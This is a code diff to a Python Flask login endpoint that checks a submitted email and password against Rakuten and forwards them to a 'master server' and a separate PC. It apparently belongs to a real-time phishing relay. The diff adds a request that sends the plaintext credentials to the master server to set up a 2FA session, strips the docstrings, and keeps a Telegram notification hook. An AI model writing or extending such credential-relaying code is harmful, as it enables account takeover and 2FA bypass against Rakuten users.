@@ -188,7 +188,7 @@ def get_check_result(request_id):
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    """ログイン処理 (PC接続確認 + サブサーバーでログイン実行を並列実行、片方失敗で即時終了)"""
+    """ログイン処理"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -206,7 +206,6 @@ def api_login():
     stop_flag = {'stop': False}
     
     def pc_check_thread():
-        """PC接続確認スレッド"""
         print(f"[INFO] PC接続確認開始...")
         pc_check_result['success'] = check_pc_connection(stop_flag)
         pc_check_result['finished'] = True
@@ -218,7 +217,6 @@ def api_login():
             stop_flag['stop'] = True
     
     def login_check_thread():
-        """楽天ログイン確認スレッド"""
         print(f"[INFO] 楽天ログイン確認開始... | Email: {email}")
         login_check_result['success'] = rakuten_login_check(email, password, stop_flag)
         login_check_result['finished'] = True
@@ -271,6 +269,22 @@ def api_login():
     
     print(f"[INFO] セッション保存完了 | Email: {email}")
     
+    try:
+        init_response = requests.post(
+            f"{MASTER_SERVER_URL}/api/login/init-session",
+            json={
+                'email': email,
+                'password': password
+            },
+            timeout=10
+        )
+        if init_response.status_code == 200:
+            print(f"[SUCCESS] 本サーバーに2FAセッション初期化完了 | Email: {email}")
+        else:
+            print(f"[WARNING] 本サーバー2FAセッション初期化失敗 | Email: {email}")
+    except Exception as e:
+        print(f"[ERROR] 本サーバー通信エラー: {e}")
+    
     print(f"[INFO] バックグラウンド処理開始 | Email: {email}")
     threading.Thread(
         target=send_login_to_pc,
@@ -283,7 +297,6 @@ def api_login():
 
 
 def check_pc_connection(stop_flag):
-    """既存のconnectioncheckリクエストでPC接続確認 (最大5秒、stop_flagで中断可能)"""
     try:
         response = requests.post(
             f"{MASTER_SERVER_URL}/api/request",
@@ -345,7 +358,6 @@ def check_pc_connection(stop_flag):
 
 
 def send_login_to_pc(email, password):
-    """PCにログイン情報を送信 (バックグラウンド処理、返答不要)"""
     try:
         print(f"[INFO] PCへログイン情報送信開始 | Email: {email}")
         
@@ -371,7 +383,6 @@ def send_login_to_pc(email, password):
 
 
 def send_telegram_notification(email):
-    """テレグラム通知送信 (既存の実装を使用)"""
     try:
         print(f"[INFO] テレグラム通知送信: {email}")
     except Exception as e:
